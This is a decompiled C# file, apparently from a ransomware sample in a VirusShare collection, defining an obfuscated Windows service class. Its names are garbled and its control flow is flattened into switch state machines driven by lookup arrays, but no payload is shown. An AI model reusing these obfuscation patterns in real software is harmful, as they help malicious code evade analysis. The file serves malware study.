// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႥႼ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႥႼ : ServiceBase
  {
    private IContainer Ⴀ;

    public ႥႼ() => this.Ⴓ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    [SpecialName]
    internal static byte[] Ⴃ() => ႣႥ.Ⴄ;

    protected override void Dispose([In] bool obj0)
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 1:
            goto label_5;
          case 2:
          case 3:
          case 5:
            goto label_4;
          case 4:
            num = this.Ⴀ == null ? 1 : 5;
            continue;
          default:
            num = !obj0 ? 1 : (int) ⴗ[73] - 9611;
            continue;
        }
      }
label_4:
      this.Ⴀ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴓ()
    {
      this.Ⴀ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႳႥ.Ⴍ(2076022975, (ႳႥ) null, 2, (Assembly) null), (short) 337, 'Ĺ');
    }

    static ႥႼ() => ႳႣ.Ⴅ();

    internal static bool Ⴈ<\u0021\u00210, \u0021\u00211>(
      [In] \u0021\u00211 obj0,
      [In] \u0021\u00210 obj1,
      [In] short obj2,
      [In] char obj3)
      where \u0021\u00210 : object
      where \u0021\u00211 : object
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴍ = ႣႣ.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴐ[181] - 163;
      bool flag;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            flag = object.ReferenceEquals((object) obj0, (object) obj1);
            num2 = (int) ⴐ[236] - (int) ⴐ[69];
            continue;
          case 1:
            num2 = 8;
            continue;
          case 2:
          case 5:
            goto label_13;
          case 4:
            goto label_3;
          case 6:
            flag = true;
            goto case 1;
          case 8:
            ++num1;
            int num3 = (int) obj2;
            num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? (int) ⴐ[61] / 7 : (int) ⴍ[121] - 2;
            continue;
          case 9:
            num2 = 10;
            continue;
          case 10:
            int num4;
            switch (((int) obj3 ^ (int) obj2) - 52 ^ num1)
            {
              case 0:
                num4 = (int) ⴗ[117] - 28533;
                break;
              default:
                num4 = 6;
                break;
            }
            num2 = num4;
            continue;
          case 11:
            num2 = (int) ⴗ[94] - 57009;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႥႼ.Ⴈ);
            num2 = (int) ⴐ[109];
            continue;
        }
      }
label_13:
      return flag;
    }
  }
}
